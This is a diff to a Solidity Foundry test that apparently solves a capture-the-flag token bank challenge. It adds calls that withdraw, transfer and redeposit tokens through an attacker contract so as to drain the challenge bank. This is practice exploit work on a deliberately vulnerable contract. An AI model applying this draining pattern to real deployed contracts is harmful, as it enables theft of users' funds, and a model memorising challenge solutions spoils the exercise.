@@ -14,12 +14,27 @@ contract TankBankTest is Test {
     function testExploit() public {
         tokenBankChallenge = new TokenBankChallenge(player);
         tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));
-
         // Put your solution here
+        // tokenBankChallenge get all the actual token
+        // tokenBankChallenge balanceOf 50% for msg.sender(this caller), 50% for player
+        uint256 amount = 500000 * 10 ** 18;
+        tokenBankChallenge.withdraw( amount);
+        SimpleERC223Token token = tokenBankChallenge.token();
+        token.transfer(address(tokenBankAttacker), amount);
+        tokenBankAttacker.deposit();
+        tokenBankAttacker.callWithdraw();
 
-        _checkSolved();
+ 
+
+       _checkSolved();
     }
+        function tokenFallback(
+        address from,
+        uint256 value,
+        bytes memory data
+    ) external{
 
+    }
     function _checkSolved() internal {
         assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
     }
